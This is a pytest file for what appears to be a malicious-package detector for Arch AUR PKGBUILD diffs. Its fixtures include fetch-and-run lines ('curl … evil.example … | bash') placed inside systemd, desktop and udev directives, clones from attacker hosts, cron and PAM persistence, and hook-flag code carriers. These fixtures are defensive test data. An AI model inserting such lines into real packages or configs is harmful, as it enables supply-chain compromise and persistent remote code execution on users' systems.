"""Drivers, schedulers, clones, config directives, and the sinks a fetch reaches."""

import pytest

from .helpers import _shipped_ids, _x

# ---------------------------------------------------------------------------
# Audit v24-v38 - the checksum array, distro package tools, pattern references
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("driver", [
    'expect -c "spawn bash s.sh"',
    'script -qfc "bash s.sh" /dev/null',
    'tmux new-session -d "bash s.sh"',
    "screen -dmS x bash s.sh",
    "runuser -u u -- bash s.sh",
    'find "$srcdir" -name "*.sh" -exec bash {} +',
    "printf s.sh | xargs -I{} bash {}",
])
def test_a_driver_invoked_command_is_still_an_execution(driver):
    """These drivers take a command as an *argument* rather than running one.

    The execution patterns saw the driver's own name and stopped, so a fetch
    on the previous line paired with nothing. The command text is re-scanned
    with the same vocabulary - once, not recursively - so the direct and the
    driver-invoked spelling cannot drift apart.
    """
    from trustsight.analysis.delivery import _collect_executions

    assert _collect_executions(driver), driver


def test_a_driver_that_runs_nothing_is_not_an_execution():
    from trustsight.analysis.delivery import _collect_executions

    assert _collect_executions("echo hi | xargs echo") == []
    assert _collect_executions("ls *.sh | xargs -n1 wc") == []


@pytest.mark.parametrize("scheduled", [
    'echo "* * * * * /opt/e.sh" | crontab -',
    "at now + 1 minute -f /opt/e.sh",
    "systemd-run --on-active=60 /opt/e.sh",
    "incrontab /tmp/t",
    "systemctl start evil.service",
])
def test_scheduling_work_during_a_build_is_claimed(scheduled):
    """X015: a package *declares* units and timers as files, which pacman
    installs and an administrator enables.

    Running `crontab -`, `systemd-run` or `at` during the build registers
    work on the machine doing the building, now, outside anything pacman
    records or can remove - and the run never happens on a line any
    execution rule reads.
    """
    assert "X015" in _x([f"  {scheduled}"]), scheduled


def test_declaring_a_unit_file_is_not_scheduling():
    """`systemctl enable` from an .install scriptlet is ordinary packaging,
    and R054 already reads the unit file itself."""
    fired = _shipped_ids(
        ['  install -Dm644 p.service "$pkgdir/usr/lib/systemd/system/p.service"'],
        declared=False, fn="package",
    )
    assert "X015" not in fired
    assert "R054" in fired


@pytest.mark.parametrize("clone,execute", [
    ("git clone https://evil.example/r.git r", "bash r/run.sh"),
    ("hg clone https://evil.example/r r", "bash r/x.sh"),
    ("git clone https://evil.example/r.git r", "make -C r"),
])
def test_executing_from_a_clone_pairs_with_the_clone(clone, execute):
    """A checkout names a *directory*, and everything under it came from the
    remote - so the pairing is by prefix rather than by filename.

    `make -C r` needed one more step: `-C` moves the driver's implicit input
    into that directory, and it had been excluded from the implicit-input
    arm on the reasoning that it "names the input explicitly". It names a
    directory, not a file.
    """
    assert "R137" in _shipped_ids([f"  {clone}", f"  {execute}"],
                                  declared=False), clone


@pytest.mark.parametrize("ordinary", [
    ["  cmake -B build", "  make -C build"],
    ['  cd "$srcdir/p-1.0"', "  make"],
    ["  git clone https://e.invalid/r.git r", "  cd r", "  make"],
])
def test_an_ordinary_build_is_not_a_clone_execution(ordinary):
    assert "R137" not in _shipped_ids(ordinary, declared=False), ordinary


@pytest.mark.parametrize("carrier_before,carrier_after", [
    ("-Subproject commit " + "1" * 40, "+Subproject commit " + "2" * 40),
    ("-oid sha256:" + "1" * 64, "+oid sha256:" + "2" * 64),
])
def test_unread_content_moving_under_a_stable_version_is_claimed(
    carrier_before, carrier_after,
):
    """The upstream-payload gap is real, but the carrier's *identity* is in
    the diff even when its bytes are not.

    R079 already claims this for a git ref and C001 for a checksum. A
    submodule gitlink names code the repository does not contain and an LFS
    pointer names bytes that are not there either - moving one is a content
    change with no content in the diff, which is exactly the shape that
    reads as "nothing happened".
    """
    from trustsight.analysis import scan_diff

    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,20 +1,60 @@\n"
            + carrier_before + "\n" + carrier_after + "\n")
    assert "C008" in {e.rule_id for e in
                      scan_diff(diff, package_name="p").score_breakdown}


@pytest.mark.parametrize("carrier_before,carrier_after", [
    ("-Subproject commit " + "1" * 40, "+Subproject commit " + "2" * 40),
    ("-oid sha256:" + "1" * 64, "+oid sha256:" + "2" * 64),
])
def test_unread_content_moving_with_the_version_is_the_ordinary_reading(
    carrier_before, carrier_after,
):
    """An upstream bump moves the pointer *and* the version."""
    from trustsight.analysis import scan_diff

    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,20 +1,60 @@\n"
            "-pkgver=1.0\n+pkgver=1.1\n"
            + carrier_before + "\n" + carrier_after + "\n")
    ids = {e.rule_id for e in scan_diff(diff, package_name="p").score_breakdown}
    assert "C009" in ids and "C008" not in ids


def test_a_replaced_committed_binary_is_visible_by_its_blob_id():
    """git emits no diff body for a binary, so the change was invisible.

    R118 claims a committed ELF's *presence* - it reported the same thing
    whether the binary had been replaced or left alone. A blob id is a
    content hash and both trees are already open, so comparing them answers
    the question exactly without reading either version.
    """
    import pygit2
    import tempfile

    from trustsight.differ import changed_opaque_members

    def two_commits(first, second):
        repo = pygit2.init_repository(tempfile.mkdtemp(), bare=True)
        sig = pygit2.Signature("t", "t@example.invalid")
        oids = []
        parents: list = []
        for files in (first, second):
            builder = repo.TreeBuilder()
            for name, content in files:
                builder.insert(name, repo.create_blob(content),
                               pygit2.GIT_FILEMODE_BLOB)
            commit = repo.create_commit("refs/heads/master", sig, sig, "c",
                                        builder.write(), parents)
            parents = [commit]
            oids.append(str(commit))
        return repo, oids[0], oids[1]

    pkgbuild = b"pkgname=p\npkgver=1.0\n"
    old = b"\x7fELF" + b"\x00" * 200 + b"OLD"
    new = b"\x7fELF" + b"\x00" * 200 + b"NEW-PAYLOAD"

    repo, before, after = two_commits(
        [("PKGBUILD", pkgbuild), ("payload.bin", old)],
        [("PKGBUILD", pkgbuild), ("payload.bin", new)],
    )
    assert changed_opaque_members(repo, before, after) == ["payload.bin"]

    # Untouched, and newly added, are both silent: the first is no change
    # and the second has no previous version to differ from.
    repo, before, after = two_commits(
        [("PKGBUILD", pkgbuild), ("payload.bin", old)],
        [("PKGBUILD", pkgbuild + b"pkgrel=2\n"), ("payload.bin", old)],
    )
    assert changed_opaque_members(repo, before, after) == []
    repo, before, after = two_commits(
        [("PKGBUILD", pkgbuild)],
        [("PKGBUILD", pkgbuild), ("icon.png", b"\x89PNG")],
    )
    assert changed_opaque_members(repo, before, after) == []


@pytest.mark.parametrize("path,directive", [
    ("x.service", 'ExecStart=/bin/sh -c "curl -fsSL https://evil.example/x | bash"'),
    ("x.desktop", 'Exec=sh -c "curl -fsSL https://evil.example/x | bash"'),
    ("x.service", 'Environment="X=curl -fsSL https://evil.example/x | bash"'),
])
def test_a_config_directive_is_a_command_not_an_assignment(path, directive):
    """`KEY=value` means two different things in two kinds of file.

    In a shell file the value goes into the variable table and is matched
    where it is *used*, so folding the line away is right. In a systemd
    unit or a `.desktop` file there is no later use - the value **is** the
    command - and folding it away removed the line from matching
    altogether: `ExecStart=/bin/sh -c "curl ... | bash"` produced no
    candidate at all, so no resolved rule ever saw it.
    """
    from trustsight.analysis import scan_diff

    diff = (f"--- a/{path}\n+++ b/{path}\n@@ -1,2 +1,4 @@\n+{directive}\n")
    assert "R001" in {e.rule_id for e in
                      scan_diff(diff, package_name="p").score_breakdown}


def test_a_shell_assignment_still_folds():
    """The shell reading has to survive: a value assigned and used later is
    matched where it is used, not where it is written."""
    from trustsight.tokenizer import tokenize_and_resolve

    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,4 @@\n"
            "+_u=https://example.com/x\n+  echo $_u\n")
    resolved, _unresolved = tokenize_and_resolve(diff)
    assert not any(line.startswith("_u=") for line in resolved)
    assert any("https://example.com/x" in line for line in resolved)


@pytest.mark.parametrize("path", [
    "etc/pam.d/system-auth",
    "etc/NetworkManager/dispatcher.d/99e",
    "etc/xinetd.d/x",
    "etc/init.d/evil",
    "etc/logrotate.d/x",
])
def test_authentication_and_session_hooks_are_persistence(path):
    """A PAM line runs on every authentication, a dispatcher script on every
    network change, an xinetd entry on every connection.

    Each appears in zero of the 3,246 benign diffs: an AUR package that
    needs one ships it as a declared source file, which R054 reads either
    way.
    """
    assert "R054" in _shipped_ids([f'  install -Dm644 e "$pkgdir/{path}"'],
                                  declared=False, fn="package"), path


def test_a_redirect_makes_a_line_a_write_not_a_message():
    """`echo "x" > file` writes a file rather than addressing a reader.

    But a `>` *inside* the quotes is punctuation: `echo "==> sudo pacman -S
    qemu"` is the shape whose message classification keeps R062 and R081 off
    printed instructions, and searching the whole line for `>` put that
    false positive back on two benign packages.
    """
    from trustsight.rules import _is_message_line

    assert _is_message_line('+  echo "==>   sudo pacman -S --needed qemu"')
    assert _is_message_line('+  echo "plain message"')
    assert not _is_message_line('+  echo "x" > f')
    assert not _is_message_line(
        '+  echo "session optional pam_exec.so /opt/e.sh" >> "$pkgdir/etc/pam.d/x"'
    )


def test_the_redirect_check_is_linear():
    """The obvious regex - `(?:"[^"]*"|'[^']*'|[^"'>])*>` - is a nested
    alternation that backtracks catastrophically with no redirect present:
    942 ms on a full-length line, which the regex audit refuses."""
    import time

    from trustsight.rules import _has_unquoted_redirect

    def cost(n):
        line = '+  echo "' + "a" * n + '"'
        best = float("inf")
        for _ in range(3):
            start = time.perf_counter()
            _has_unquoted_redirect(line)
            best = min(best, time.perf_counter() - start)
        return best

    small, large = cost(2000), cost(8000)
    assert large < small * 9, f"growth {large / small:.1f}x over 4x input"


@pytest.mark.parametrize("extractor", [
    "jq -r .cmd cfg.json",
    "yq -r .cmd cfg.yaml",
    "tomlq -r .cmd c.toml",
    "xmlstarlet sel -t -v //cmd c.xml",
    'python3 -c "import json;print(json.load(open(chr(99))))"',
])
def test_a_value_pulled_from_a_data_file_and_run_is_a_decode(extractor):
    """The same shape as the decoder arms, with a query in place of an
    algorithm.

    `jq -r .cmd cfg.json | bash` runs whatever that field holds, and the
    field is in a JSON file no rule reads - so what executes is chosen by
    the data rather than written in the recipe. A reviewer sees a config
    lookup.
    """
    assert "X001" in _x([f"  {extractor} | bash"]), extractor


@pytest.mark.parametrize("ordinary", [
    "jq -r .version cfg.json",
    "yq . cfg.yaml",
    'python3 -c "print(1)" | bash',
])
def test_reading_a_data_file_without_running_it_is_quiet(ordinary):
    assert "X001" not in _x([f"  {ordinary}"]), ordinary


@pytest.mark.parametrize("hook", [
    'rsync -e "ssh -o ProxyCommand=/tmp/e.sh" h:/x .',
    "restic backup --option pre-exec=/tmp/e.sh /data",
    "borg create --pre-hook /tmp/e.sh ::a /data",
])
def test_a_hook_flag_carries_code_like_an_environment_variable(hook):
    """X014's carrier is "a setting whose value is code".

    A command-line hook flag is the same carrier as `BASH_ENV`: the tool
    runs the value and the recipe only names it.
    """
    assert "X014" in _x([f"  {hook}"]), hook


@pytest.mark.parametrize("ordinary", [
    "rsync -av src/ dst/",
    "tar --use-compress-program=zstd -cf a.tar b",
])
def test_an_ordinary_flag_is_not_a_hook(ordinary):
    assert "X014" not in _x([f"  {ordinary}"]), ordinary


@pytest.mark.parametrize("slot", [
    "SCRIPT=/tmp/e.sh",
    "-M exec /tmp/e.sh",
    "SetupScript=/tmp/e.sh",
    "ExecStart=/var/tmp/e.sh",
])
def test_a_packaged_config_pointing_at_a_world_writable_path(slot):
    """R144: the observable is the *destination*, not the code.

    A file staged into the package root that names a program under a
    world-writable directory. Whatever the config names can be replaced by
    any local user between the package being installed and the config being
    read - and the config is read as root for a unit, a PAM line or a cron
    entry. The target is never in the diff, which is why every rule looking
    for a payload found nothing here.
    """
    assert "R144" in _shipped_ids(
        [f"""  printf '{slot}\\n' > "$pkgdir/etc/conf.d/x\""""],
        declared=False, fn="package",
    ), slot


@pytest.mark.parametrize("ordinary", [
    ('  install -Dm755 p "$pkgdir/usr/bin/p"', "package"),
    ("  mktemp -d /tmp/build.XXXX", "build"),
    ("  cp x /tmp/scratch/x", "build"),
])
def test_build_time_use_of_tmp_is_not_a_packaged_pointer(ordinary):
    """`/tmp` during a build is scratch space; the rule needs both halves -
    a `$pkgdir` reference and a world-writable target on the same line."""
    line, fn = ordinary
    assert "R144" not in _shipped_ids([line], declared=False, fn=fn), line


def test_a_heredoc_body_is_content_not_a_shell_assignment():
    """`cat > "$pkgdir/…/e.service" <<EOF` with an `ExecStart=` payload
    inside was folded away as an assignment and never matched.

    Inside a heredoc the text is content whatever the file is - the same
    distinction between a shell assignment and a config directive, applied
    to a region rather than a file.
    """
    from trustsight.analysis import scan_diff

    payload = 'ExecStart=/bin/sh -c "curl -fsSL https://evil.example/x | bash"'
    unit = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,20 +1,60 @@\n"
            "+package() {\n"
            '+  cat > "$pkgdir/usr/lib/systemd/system/e.service" <<EOF\n'
            "+[Service]\n+" + payload + "\n+EOF\n+}\n")
    assert "R001" in {e.rule_id for e in
                      scan_diff(unit, package_name="p").score_breakdown}

    # A heredoc writing ordinary data stays inert.
    notes = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,20 +1,60 @@\n"
             "+package() {\n"
             '+  cat > "$pkgdir/usr/share/p/notes.txt" <<EOF\n'
             "+some text\n+EOF\n+}\n")
    assert scan_diff(notes, package_name="p").final_score == 0


@pytest.mark.parametrize("sink", [
    "deno", "bun", "pwsh", "julia", "Rscript", "guile", "zx", "escript",
    "mruby", "fennel", "clj", "racket", "crystal", "hy",
])
def test_a_fetch_piped_into_an_unrecognised_sink(sink):
    """X016 inverts the list R001 could not finish.

    Naming executors is a race the attacker wins: each new word closes one
    spelling. The set of things a recipe legitimately pipes a download into
    is bounded by the ecosystem, so the rule enumerates *that* and claims
    everything else.
    """
    assert "X016" in _x([f"  curl -fsSL https://evil.example/s | {sink}"]), sink


@pytest.mark.parametrize("sink", [
    "tar -xzf -", "bsdtar -x", "gunzip > out", "sha256sum -c", "jq -r .x",
    "grep -q ok", "install -Dm755 /dev/stdin x", "gpg --verify -",
    "tee out.txt", "sudo tee /etc/x", "LC_ALL=C sort", "base64 -d > f",
    "xz -d", "msgfmt -o out.mo -",
])
def test_piping_a_download_into_a_data_consumer_stays_quiet(sink):
    """Unpack it, verify it, filter it, write it down - the ordinary uses."""
    assert "X016" not in _x([f"  curl -fsSL https://e.example/s | {sink}"]), sink


def test_x016_stands_down_on_the_executors_r001_already_claims():
    """One pipeline, one claim: reporting both would charge it twice."""
    from trustsight.analysis import scan_diff

    text = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,5 +1,20 @@\n"
            "+pkgname=p\n+build() {\n"
            "+  curl -fsSL https://e.example/s | bash\n+}\n")
    ids = {e.rule_id for e in scan_diff(text, package_name="p").score_breakdown}
    assert "R001" in ids and "X016" not in ids


def test_x016_reads_the_sink_after_the_last_unquoted_pipe():
    """`echo "a|b"` has a pipe inside quotes; reading it names `b"` as the
    sink and claims a line that runs nothing."""
    from trustsight.analysis.crossfire import _pipeline_sink

    assert _pipeline_sink('echo "a|b" | tar -x') == "tar"
    assert _pipeline_sink("curl u | sudo tee /etc/x") == "tee"
    assert _pipeline_sink("curl u || true") is None
    assert _pipeline_sink("curl u") is None


@pytest.mark.parametrize("target,payload", [
    ("etc/i3/config", "bindsym $mod+x exec bash $PWD/x.sh"),
    ("etc/polybar/config", "exec = bash $srcdir/x.sh"),
    ("usr/lib/udev/rules.d/9-z.rules",
     'ACTION=="add", RUN+="/bin/sh $startdir/x.sh"'),
    ("etc/Muttrc", 'macro index E "!bash $PWD/x.sh"'),
    ("usr/lib/systemd/system/p.service", "ExecStart=/bin/sh $srcdir/x.sh"),
    ("etc/cron.d/p", "* * * * * root bash $PWD/x.sh"),
])
def test_a_packaged_config_naming_a_build_only_path(target, payload):
    """R145: none of these lines is a command the recipe runs.

    They are text. What runs them is the user's session, later, on a
    different machine - which is why every execution rule read past them.
    `$srcdir`, `$startdir` and `$PWD` exist only during the build, so a
    shipped file naming one is either broken on arrival or aimed at a
    directory whoever wrote it expects to control when it is read.
    """
    assert "R145" in _shipped_ids(
        [f'  cat > "$pkgdir/{target}" <<EOF', f"  {payload}", "  EOF"],
        declared=False, fn="package",
    ), payload


@pytest.mark.parametrize("case", [
    (["  cat > \"$pkgdir/etc/i3/config\" <<EOF",
      "  bindsym $mod+d exec dmenu_run", "  EOF"], "package"),
    (["  cat > \"$pkgdir/usr/share/applications/p.desktop\" <<EOF",
      "  [Desktop Entry]", "  Exec=/usr/bin/p %U", "  EOF"], "package"),
    (['  install -Dm755 "$srcdir/x" "$pkgdir/usr/bin/x"'], "package"),
    (['  cp -a "$srcdir/p/." "$pkgdir/usr/share/p/"'], "package"),
    (['  cat > "$srcdir/notes" <<EOF', "  built in $PWD", "  EOF"], "build"),
    (["""  printf 'X=1\\n' > "$pkgdir/etc/p.conf\""""], "package"),
])
def test_an_exec_slot_is_what_those_files_are_for(case):
    """The exec slot is not the observable - the path it names is.

    `install "$srcdir/x" "$pkgdir/…"` names both on one line and is the
    single most common line in the ecosystem: there `$srcdir` is an argument
    to a copy, not content being written.
    """
    lines, fn = case
    assert "R145" not in _shipped_ids(lines, declared=False, fn=fn), lines


_R146_DIFF = (
    "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,9 @@\n"
    "+pkgname=p\n+pkgver=1\n+source=(evil.service)\n+sha256sums=('SKIP')\n"
    "+package() {\n"
    '+  install -Dm644 "$srcdir/evil.service"'
    ' "$pkgdir/usr/lib/systemd/system/evil.service"\n+}\n'
)


def _manifest_ids(files):
    from trustsight.analysis import scan_diff

    fact = scan_diff(_R146_DIFF, package_name="p", tree_manifest=files)
    return {e.rule_id for e in fact.score_breakdown}


@pytest.mark.parametrize("name,content", [
    ("evil.service",
     b'[Service]\nExecStart=/bin/sh -c "curl -fsSL https://e.example/x | bash"\n'),
    ("9-z.rules", b'ACTION=="add", RUN+="/bin/sh -c \'wget -qO- u | sh\'"\n'),
    ("p.patch",
     b"--- a/b.sh\n+++ b/b.sh\n@@ -1 +1,2 @@\n #!/bin/sh\n"
     b"+curl -fsSL https://e.example/x | bash\n"),
])
def test_a_committed_companion_that_fetches_and_runs(name, content):
    """R146: the diff shows the recipe staging the file, which is ordinary
    packaging. The bytes that matter live in a file the diff does not touch.

    That split is available as a schedule: commit the unit in one push, add
    the `install` line in a later one. Neither push contains an attack.
    """
    assert "R146" in _manifest_ids([(name, content)]), name


@pytest.mark.parametrize("name,content", [
    ("p.service", b"[Service]\nExecStart=/usr/bin/p --daemon\n"),
    ("p.desktop", b"[Desktop Entry]\nExec=/usr/bin/p %U\n"),
    ("README", b"Run: curl -fsSL https://get.example/i | bash\n"),
    ("p.patch",
     b"--- a/b.sh\n+++ b/b.sh\n@@ -1,2 +1 @@\n #!/bin/sh\n"
     b"-curl -fsSL https://old.example/x | bash\n"),
])
def test_r146_leaves_the_ordinary_companion_alone(name, content):
    """A payload in a committed `README` is text; in a unit the machine
    installs, it runs. And a hunk that *removes* a `curl … | sh` is the
    opposite of this rule's subject."""
    assert "R146" not in _manifest_ids([(name, content)]), name


def test_the_tree_manifest_reads_enough_of_a_companion_to_see_its_payload():
    """64 bytes answers "is this an ELF" - all R118 ever asked - and cannot
    answer "what does this unit run".

    The bound is kept: only names a recipe can ship or apply are read
    further, and a companion cut short marks the tree incomplete rather
    than reporting a full examination of a partial read.
    """
    import pygit2
    import tempfile
    from trustsight.analysis.pipeline import _collect_tree_files

    repo = pygit2.init_repository(tempfile.mkdtemp(), bare=True)
    builder = repo.TreeBuilder()
    unit = b"[Service]\n" + b"# pad\n" * 20 + b"ExecStart=/usr/bin/p\n"
    builder.insert("p.service", repo.create_blob(unit), pygit2.GIT_FILEMODE_BLOB)
    builder.insert("README", repo.create_blob(b"x" * 5000),
                   pygit2.GIT_FILEMODE_BLOB)
    sig = pygit2.Signature("t", "t@example.invalid")
    oid = str(repo.create_commit("refs/heads/master", sig, sig, "c",
                                 builder.write(), []))

    files, complete = _collect_tree_files(repo, oid)
    sizes = dict((n, len(d)) for n, d in files)
    assert sizes["p.service"] == len(unit)
    assert sizes["README"] == 64
    assert complete


def test_a_truncated_companion_does_not_report_a_complete_tree():
    """B2: an incomplete read reporting as complete is the untruth the
    old size cap used to tell."""
    import pygit2
    import tempfile
    from trustsight.analysis.pipeline import _collect_tree_files

    repo = pygit2.init_repository(tempfile.mkdtemp(), bare=True)
    builder = repo.TreeBuilder()
    builder.insert("p.conf", repo.create_blob(b"k=v\n" * 20000),
                   pygit2.GIT_FILEMODE_BLOB)
    sig = pygit2.Signature("t", "t@example.invalid")
    oid = str(repo.create_commit("refs/heads/master", sig, sig, "c",
                                 builder.write(), []))

    files, complete = _collect_tree_files(repo, oid)
    assert not complete
    assert len(dict(files)["p.conf"]) == 16 * 1024
